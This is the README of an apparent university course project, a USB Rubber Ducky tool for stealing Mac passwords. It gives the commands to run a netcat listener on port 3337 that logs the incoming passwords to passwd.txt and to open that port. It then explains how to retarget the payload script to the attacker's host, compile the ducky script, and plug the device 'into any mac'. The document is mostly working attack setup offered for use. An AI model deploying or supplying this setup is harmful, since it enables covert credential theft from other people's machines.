# Automatic Mac Password Gabber

## Setup First

### Create following script and execute it on your host

* Listening on port 3337

```shell
#!/bin/bash
while [ true ]
do
netcat -vlp 3337 &>> passwd.txt
done
```

* Open firewall for port 3337

```shell
sudo ufw allow 3337/tcp
```

## How To Use

### Clone the repository to your machine

```shell
git clone https://github.com/ohbriansung/usb_rubber_ducky.git
```

### Change TARGET to your host in the script: [gabber.sh](./gabber.sh)

```shell
vi ./usb_rubber_ducky/auto_mac_pw_grab/gabber.sh
```

### Upload updated script to your own github repository

### Change gabber script download address in the ducky script on line 16: [ducky_grabber.txt](./ducky_grabber.txt)

```shell
vi ./usb_rubber_ducky/auto_mac_pw_grab/ducky_grabber.txt
```

### Plug in your microSD card and compile the ducky script into binary

```shell
java -jar ~/Downloads/duckencoder.jar  -i ./usb_rubber_ducky/auto_mac_pw_grab/ducky_grabber.txt -o /Volumes/NO\ NAME/inject.bin
```

### Insert the microSD card into your USB Rubber Ducky and plug your device into any mac!

## Acknowledgement

This is a course project developed at University of San Francisco. Only for academic or personal use, not for any commercial purpose.

## Author

* **Brian Sung** - *Graduate student in department of Computer Science at University of San Francisco* - [LinkedIn](https://www.linkedin.com/in/ohbriansung/)

## Reference

\[1\] https://github.com/hak5darren/USB-Rubber-Ducky
\[2\] https://github.com/danielmiessler
